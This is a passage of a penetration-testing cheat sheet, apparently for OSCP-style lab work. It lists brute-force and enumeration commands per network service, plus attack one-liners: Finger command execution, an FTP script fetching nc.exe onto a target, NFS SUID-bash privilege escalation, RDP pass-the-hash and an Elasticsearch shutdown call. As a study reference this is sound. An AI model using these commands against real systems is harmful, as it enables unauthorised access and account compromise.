Enumerate valid users using Finger * http_fuzz : Brute - force HTTP / HTTPS * rdp_gateway : Brute - force RDP Gateway * ajp_fuzz : Brute - force AJP * pop_login : Brute - force POP * pop_passd : Brute - force poppassd ( not POP3 ) * imap_login : Brute - force IMAP * ldap_login : Brute - force LDAP * smb_login : Brute - force SMB * smb_lookupsid : Brute - force SMB SID - lookup * rlogin_login : Brute - force rlogin * vmauthd_login : Brute - force VMware Authentication Daemon * mssql_login : Brute - force MSSQL * oracle_login : Brute - force Oracle * mysql_login : Brute - force MySQL * mysql_query : Brute - force MySQL queries * rdp_login : Brute - force RDP ( NLA ) * pgsql_login : Brute - force PostgreSQL * vnc_login : Brute - force VNC * dns_forward : Brute - force DNS * dns_reverse : Brute - force DNS ( reverse lookup subnets ) * ike_enum : Enumerate IKE transforms * snmp_login : Brute - force SNMPv1 / 2 and SNMPv3 * unzip_pass : Brute - force the password of encrypted ZIP files * keystore_pass : Brute - force the password of Java keystore files * sqlcipher_pass : Brute - force the password of SQLCipher - encrypted databases * umbraco_crack : Crack Umbraco HMAC - SHA1 password hashes patator http_fuzz url = http : // example . com / index . php method = POST body = \u200b name=zapper password=FILE0 autologin=1 enter=Sign+in 0 =/ usr / share / SecLists / Passwords / darkweb2017 - top1000 . txt accept_cookie = 1 follow = 1 - x ignore : fgrep = \u200b Login name or password is incorrect. Hydra - https://github.com/vanhauser-thc/thc-hydra SSH : hydra 10.10 . 10.1 - l testuser - P wordlist . txt - t 4 ssh RDP : hydra - V - l testuser - P wordlist . txt rdp :// 10.10 . 10.1 FTP : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt ftp SMB : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt smb POST form : hydra - l testuser - p wordlist . txt - e nsr 10.10 . 10.1 http - post - form http://10.10.10.1/login.php:username=^USER^ ssword=^PASS^ submit=Login: Error message - V Asterisk , AFP , Cisco AAA , Cisco auth , Cisco enable , CVS , Firebird , FTP , HTTP - FORM - GET , HTTP - FORM - POST , HTTP - GET , HTTP - HEAD , HTTP - POST , HTTP - PROXY , HTTPS - FORM - GET , HTTPS - FORM - POST , HTTPS - GET , HTTPS - HEAD , HTTPS - POST , HTTP - Proxy , ICQ , IMAP , IRC , LDAP , MEMCACHED , MONGODB , MS - SQL , MYSQL , NCP , NNTP , Oracle Listener , Oracle SID , Oracle , PC - Anywhere , PCNFS , POP3 , POSTGRES , RDP , Rexec , Rlogin , Rsh , RTSP , SAP / R3 , SIP , SMB , SMTP , SMTP Enum , SNMP v1 + v2 + v3 , SOCKS5 , SSH ( v1 and v2 ), SSHKEY , Subversion , Teamspeak ( TS2 ), Telnet , VMware - Auth , VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa Medusa [ -h host|-H file ] [ -u username|-U file ] [ -p password|-P file ] [ -C file ] - M module [ OPT ] SSH : medusa - u testuser - P wordlist . txt - h host - M ssh FTP : ncrack - u testuser - P wordlist . txt - T 5 host - M ftp RDP ( pass - the - hash ) : medusa - M rdp - m PASS : HASH - h host - u someuser - p NTLM_hash AFP , CVS , FTP , HTTP , IMAP , MS - SQL , MySQL , NetWare NCP , NNTP , PcAnywhere , POP3 , PostgreSQL , REXEC , RDP , RLOGIN , RSH , SMBNT , SMTP - AUTH , SMTP - VRFY , SNMP , SSHv2 , Subversion ( SVN ), Telnet , VMware Authentication Daemon ( vmauthd ), VNC , Generic Wrapper , Web Form ncrack - https://github.com/nmap/ncrack SSH : ncrack - u testuser - P wordlist . txt host - p 22 RDP : ncrack - u testuser - P wordlist . txt host - p 3389 FTP : ncrack - u testuser - P wordlist . txt host - p 21 SSH , RDP , FTP , Telnet , HTTP ( S ), Wordpress , POP3 ( S ), IMAP , CVS , SMB , VNC , SIP , Redis , PostgreSQL , MySQL , MSSQL , MongoDB , Cassandra , WinRM , OWA , DICOM . [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip - D - p wordlist . txt - u test . zip 7 z2john . pl backup . 7 z 7 z2john . out Steghide https://github.com/Paradoxis/StegCracker https://github.com/Va5c0/Steghide-Brute-Force-Tool 7zip https://github.com/Seyptoo/7z-BruteForce OpenSSL keys https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE","title":"Brute-forcing"},{"location":"password-attacks/#references","text":"","title":"References"},{"location":"password-attacks/#new-references","text":"LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"New References"},{"location":"ports-and-protocols/","text":"Service Name and Transport Protocol Port Number Registry Template ## Name - port / tcp_or_udp ** Quick Reference ** ** Tools ** ** Hardening ** ** References ** Citrix - 1494/tcp Quick Reference Enumeration: ./citrix-pa-scan { IP_address/file | - | random } [ timeout ] citrix-pa-proxy.pl IP_to_proxy_to [ Local_IP ] DHCP Quick Reference Get new IP address from DHCP: Send DHCPDISCOVER Receive DHCPOFFER dhclient DNS - 53/tcp Quick Reference DNS on TCP Check for zone transfers Maybe DNS Sec enabled Configuration files host . conf resolv . conf named . conf Order of name resolution: / etc / nsswitch . conf DNS sever Information: / etc / resolv . conf Forward Lookup whois whois example.com whois 50 .7.67.186 ( reverse ) Reverse Lookup write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1 .1.168.192.in-addr.arpa. PTR for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works Zone Transfers Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns - server Domain name: dig axfr @dns - server domain . name host - l example . com ns1 . example . com dnsrecon - d $ ip - t axfr nmap $ ip --script=dns-zone-transfer -p 53 Simple Zone Transfer Script: #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ] ; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $( host -\u00ad\u2010t ns $1 | cut -\u00ad\u2010d -\u00ad\u2010f4 ) ; do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server | grep has address done Bruteforcing fierce - dns site . com fierce - dns site . com - dnserver ns1 . site . com dnsenum site . com \u2013 dnsserver ns1 . site . com dnsenum site . com - f / root / hostlist . txt Subdomain bruteforcing for ip in $( cat list.txt ) ; do host $ip . $website ; done for domain in $( cat /usr/share/wordlists/dnscan/subdomains-100.txt ) ; do host $domain .mydomain.com ; sleep 2 ; done | grep has | sort -u Reverse dns lookup bruteforcing for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -v not found DNS Recon Workflow (WIP) 1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. Tools Dnsrecon dnsrecon -r 127 .0.0.0/24 -n 10 .10.10.29 dnsrecon -r 127 .0.1.0/24 -n 10 .10.10.29 dnsrecon -r 10 .10.10.0/24 -n 10 .10.10.29 dnsrecon -d thinc.local -n 10 .11.1.220 -t axfr -r 10 .11.1.0/24 dnsrecon -d site.com host host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error host -l site.com ns2.site.com host -l friendzone.red 10 .10.10.123 | grep has address | awk {print $1} nslookup nslookup ip nslookup site.com nslookup -query = mx site.com nslookup -query = ns site.com nslookup -query = any site.com set type = a google.com server ns1.google.com google.com dig # Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} # {global-d-opt} host [@local-server] {local-d-opt} # [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com dig site.com dig site.com A dig +nocmd shite.com MX +noall +answer dig +nocmd site.com NS +noall +answer dig +nocmd site.com A +noall +answer dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer fierce: https://github.com/davidpepper/fierce-domain-scanner scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for General checks: fierce - dns example . com Wordlist attack: fierce - dns example . com - wordlist hosts . list recon-ng use recon / contacts / gather / http / api / whois_pocs set DOMAIN example . com run use recon / hosts / enum / http / web / xssed use recon / hosts / gather / http / web / google_site use recon / hosts / gather / http / web / ip_neighbor dnsenum dnsenum $ ip dnsrecon dnsrecon dnsrecon \u2010 d example . com \u2010 t axfr dnsenum dnsenum example . com subbrute Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting knock Wordlist based subdomain bruteforcing Virustotal search Sublist3r Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally Online Services https://dnsdumpster.com/ Hardening References Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/ ElasticSearch - 9200/tcp Quick Reference Interesting APIs Description URL Config information, OS, JVM version curl - XGET http : // ip : 9200 / _nodes ? pretty = true Shutdown curl - XPOST http : // ip : 9200 / _cluster / nodes / _master / _shutdown Dump data curl http:// ip :9200/_search?size=10000 pretty=true Snapshots _snapshot Hardening elasticsearch . yml - to prevent dynamic scripting: script . disable_dynamic : true https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1 Finger - 79/tcp Quick Reference User enumeration finger @example.com finger a b c d e f g h @example.com finger 1 2 3 4 5 6 7 8 9 0 @target_host finger admin@example.com finger user@example.com finger 0 @example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger - user - enum . pl - U seclists / Usernames / Names / names . txt - t ip https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh Finger Redirect finger @target_host1@target_host2 Command execution finger |/bin/id@example.com finger |/bin/ls -a /@example.com Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com References Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html FTP - 21/tcp Quick Reference Scan for anonymous FTP: nmap \u2010 v \u2010 p 21 - \u00ad\u2010 script = ftp \u2010 anon . nse 192 . 168 . 11 . 200 - 254 NSE: nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 IP Anonymous login ftp ip_address Username : anonymous Password : any @ email . com ( if prompted ) Clone: wget - r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS) Config files ftpusers ftp . conf proftpd . conf MITM pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl Common FTP Commands GET .. / .. / .. / boot . ini GET .. / .. / .. / .. / .. / .. / boot . ini MGET .. / .. / .. / boot . ini MGET .. / .. / .. / .. / .. / .. / boot . ini Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory Bruteforcing patator ftp_login host = 10 .11.1.220 port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = /root/oscp/lab-net2019/ftp-open.txt port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = FILE0 port = 21 user = COMBO0 password = COMBO1 0 = /root/oscp/lab-net2019/ftp-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 -x ignore:fgrep = \u2019cannot log in.\u2019 -x ignore:fgrep = \u2019Login incorrect\u2019 -l ftp_spray TCP FTP Bounce Scan: nmap \u2013 top - ports 1000 - vv - Pn - b anonymous : password @10.11.1.125 : 21 127.0.0.1 Script FTP echo open ( YOUR IP ) 21 C :\\ share \\ ftp . txt ( Writeable Directory on target ) echo USER pwnt C :\\ share \\ ftp . txt echo passwd C :\\ share \\ ftp . txt ( Password for your FTP Server ) echo bin C :\\ share \\ ftp . txt ( Sets transfer up for binary files / bytes ) echo GET nc . exe C :\\ share \\ nc . exe C :\\ share \\ ftp . txt echo bye C :\\ share \\ ftp . txt ftp - v - n - s : C : \\ share \\ ftp . txt Tools Hardening References IMAP - 134/tcp 993/tcp Quick Reference https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions Connecting Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client - connect IP : 993 openssl s_client - connect IP : 993 - crlf - quiet Command Format Input: RandomStringID command Response: RandomStringID OK ANSWER DETAIL Login Login Method: A1 login someuser @example . com My_P @ssword1 When AUTH = PLAIN (SASL PLAIN Method) echo - en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username , password When AUTH = LOGIN (SASL AUTH LOGIN) echo - en someuser@example.com | openssl base64 echo - en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password SASL PLAIN as an Admin User (Masquerade another user) authcidNULauthzidNULpassword echo - en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword Capability: a capability Retrieving Emails and Modifying the Inbox Namespaces: n namespace Examine Inbox: ex1 EXAMINE INBOX List of folders LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Fetch Messages f1 FETCH 1 BODY [] f2 fetch 2 RFC822 f3 fetch 1 : 4 ( BODY [ HEADER . FIELDS ( Subject )]) Unseen s search UNSEEN Delete d store 2 + FLAGS ( \\ Deleted ) e expunge Example Session 1 \\ . telnet brainfuck . htb 143 2 \\ . a1 LOGIN orestis kHGuERB29DNiNE 3 \\ . a2 LIST * 4 \\ . a3 EXAMINE INBOX 5 \\ . a4 FETCH 1 BODY [] 6 \\ . a5 FETCH 2 BODY [] Tools Hardening References IRC - 8067/tcp Quick Reference Version / Connect irssi -c 10 .10.10.117 --port 8067 LDAP - 389/tcp Quick Reference Configuration files containers . ldif ldap . cfg ldap . conf ldap . xml ldap - config . xml ldap - realm . xml slapd . conf Brute-forcing: nmap - p 389 --script ldap-brute --script-args ldap.base= cn=schema,dc=targetbox,dc=target (TARGET IP ADDRESS) -vv Dump: ldapdomaindump - u example \\ example 10 . 10 . 10 . 10 ldapsearch - LLL - x - H ldap : // domain - b - s base (objectclass=*) ldapsearch - LLL - x - H ldap : // domain - b - s base CN=example,DC=LOCAL ldapsearch - h EGOTISTICAL - BANK . LOCAL - p 389 - x - b DC=EGOTISTICAL-BANK,DC=LOCAL http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html Tools Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool Hardening References Memcache Quick Reference Connecting: telnet localhost 11211 Information gathering nmap - p 11211 --script memcached-info memcstat --servers=127.0.0.1 Read value memccat --servers = 192 .64.38.3 --username = user --password = pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END Key information and dump values version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [ 6 b ; 1256056128 s ] END Increment decrement incr id 1 decr id 1 Set new entry set phone 0 60 9 123456789 Modify value replace key 0 0 2 new - value prepend address 0 0 6 house append address 0 0 6 , 73301 Delete delete old_address flush_all 30 # invalidate all keys after 30 s Dump all keys memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst Dump all key-values memcached-tool localhost:11211 dump | less while read -r key ; do [ -f $key ] || echo get $key | nc localhost 11211 $key .dump ; done ( memcdump --server localhost ) memcdump --servers = localhost | xargs -L1 -I% sh -c echo get % | nc localhost 11211 memcmd function memcmd () { exec { memcache } /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${ memcache } cat ${ memcache } } 1.4.31 and above memcmd lru_crawler metadump all 1.4.30 and below memcmd stats items memcmd stats cachedump 1 0 for id in $( memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu ) ; do memcmd stats cachedump $id 0 done Tools Python Library: https://github.com/abstatic/python-memcached-stats Bruteforce #!/usr/bin/python3 import subprocess dictionary = open ( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary : out = subprocess . getoutput ( memcstat --servers=192.64.38.3 --username=student --password= + pwd ) if len ( out ) 0 : print ( out ) print ( PASSWORD: + pwd ) break Hardening References Modbus - 502/tcp Quick Reference Tools Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt Hardening References NFS - 2049/tcp Quick Reference Configuration files / etc / exports / etc / lib / nfs / xtab Enumeration nmap -sV --script = nfs-* 192 .168.44.133 nmap -sV --script = nfs-ls 192 .168.44.133 //same result as rpcinfo nmap -sV --script = nfs-* 192 .168.44.133 Enumerate NFS shares: showmount - e hostname / ip_address Mount NFS shares: mount -t nfs ip_address:/directory_found_exported /local_mount_point mount -t nfs 192 .168.1.72:/home/vulnix /tmp/mnt -nolock / etc / exports file contains configurations and permissions of which folders/file systems are exported to remote users Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user \"nfsnobody\" when connected. https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/ no_root_squash - Gives the remote user root access to the connected system With limited user account: cp / bin / bash / shared Then mount the share: mount - t nfs server : / shared / mnt / and run chown root : root bash chmod u + s bash Run the file with limited user account: / shared / bash Tools NFS shell - https://github.com/NetDirect/nfsshell Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts. nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example Hardening References http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm NTP - 123/tcp Quick Reference Configuration files ntp . conf Tools ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source ntpdc - Query the ntp Deamon about its current state and to request changes in the state ntpdc - c monlist IP_ADDRESS ntpdc - c sysinfo IP_ADDRESS ntpq - Monitors NTP daemon ntpd operations and determine performance Hardening NTPSec IPTables logging References POP3 - 110/tcp Quick Reference Login USER username PASS password Other commands Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body Tools Hardening References PPTP-L2TP-VPN - 500/tcp 1723/tcp Quick Reference Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf RDP - 3389/tcp Quick Reference PTH: xfreerdp / u : testing / d : thinc / pth : 31 d6cfe0d16ae931b73c59d7e0c089c0 / v : 192 . 168 . 1 . 23 Tools List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History Hardening References RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 rlogin - 513/tcp Quick Reference Locating files find / - name . rhosts locate . rhosts Manual login: rlogin hostname - l username Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp Quick Reference Summary Summary In computer networking, Server Message Block ( SMB ) , one version of which was also known as Common Internet File System ( CIFS ) , operates as an application - layer network protocol . Mainly used for providing shared access to files , printers , and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter - process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as \" Microsoft Windows Network \" before the subsequent introduction of Active Directory . Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component). SMB can run on top of the session (and lower) network layers in several ways: Directly over TCP , port 445 via the NetBIOS API , which in turn can run on several transports. On UDP ports 137 , 138 TCP ports 137 , 139 ( NetBIOS over TCP / IP ); On several legacy protocols such as NBF , IPX / SPX . The SMB Inter-Process Communication ( IPC ) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client first connects to an SMB server. Ports netbios-ns 137 / tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137 / udp . netbios-dgm 138 / tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138 / udp . netbios-ssn 139 / tcp # (NBT over IP) NETBIOS session service netbios-ssn 139 / udp . microsoft-ds 445 / tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS) Version Version enumeration auxiliary / scanner / smb / smb_version Server Message Block (SMB) Versions SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016 Samba Version Enumeration #!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ] ; then echo Usage: ./smbver.sh RHOST {RPORT} exit ; else rhost = $1 ; fi if [ ! -z $2 ] ; then rport = $2 ; else rport = 139 ; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d . | grep -oP UnixSamba.*[0-9a-z] | tr -d \\n echo -n $rhost : echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1 Scanning References: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap nmap ls -lh /usr/share/nmap/scripts/smb* nmap --script safe -p445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139 ,446 $ip --open nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139 ,445 --script vuln $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010check-vulns --script-args = unsafe = 1 $ip smb-vuln-conficker smb-vuln-cve2009-3103 smb-vuln-ms06-025 smb-vuln-ms07-029 smb-vuln-regsvc-dos smb-vuln-ms08-067 nmap --script smb-brute.nse -p445 ( TARGET IP ADDRESS ) nmap -p 139 .445 --script smb-enum-users ( TARGET IP ADDRESS ) Enable / Disable / Status Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and Windows Server 2012 R2 2016: PowerShell methods SMB v1 Detect: Get - WindowsFeature FS - SMB1 Disable: Disable - WindowsOptionalFeature - Online - FeatureName smb1protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName smb1protocol SMB v2/v3 Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 8.1 and Windows 10: PowerShell method SMB v1 Protocol Detect: Get - WindowsOptionalFeature \u2013 Online \u2013 FeatureName SMB1Protocol Disable: Disable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol SMB v2/v3 Protocol Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ true Windows 8 and Windows Server 2012 SMB v1 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set - SmbServerConfiguration - EnableSMB1Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB1Protocol $ true SMB v2/v3 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008 SMB v1 on SMB Server Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get - Item HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 1 \u2013 Force SMB v2/v3 on SMB Server Detect: Get - ItemProperty HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 1 \u2013 Force Disable SMB Client SMB v1 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start = auto SMB v2/v3 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start = auto Other NetBIOS suffixes For unique names: 00 : Workstation Service ( workstation name ) 03 : Windows Messenger service 06 : Remote Access Service 20 : File Service ( also called Host Record ) 21 : Remote Access Service client 1 B : Domain Master Browser \u2013 Primary Domain Controller for a domain 1 D : Master Browser For group names: 00 : Workstation Service ( workgroup / domain name ) 1 C : Domain Controllers for a domain 1 E : Browser Service Elections User enumerate: scanner / smb / smb_lookupsid Bruteforcing: auxiliary/scanner/smb/smb_login while read USER ; do echo $USER smbmap -H 10 .10.10.172 -u $USER -p $USER ; done userslist patator smb_login host = 10 .121.1.33 domain = CONTOSO user = COMBO00 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -l smb_brute patator smb_login host = FILE0 domain = CONTOSO.LOCAL user = COMBO10 password = COMBO11 0 = /root/oscp/lab-net2019/smb-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u201dSTATUS_LOGON_FAILURE\u201d \u2013timeout 100 \u2013threads = 2 \u2013rate-limit = 2 Mount SMB share sudo apt-get install cifs-utils mkdir /mnt/ $shareName mount -t cifs // $ip / $shareName /mnt/ $shareName -o username = $username 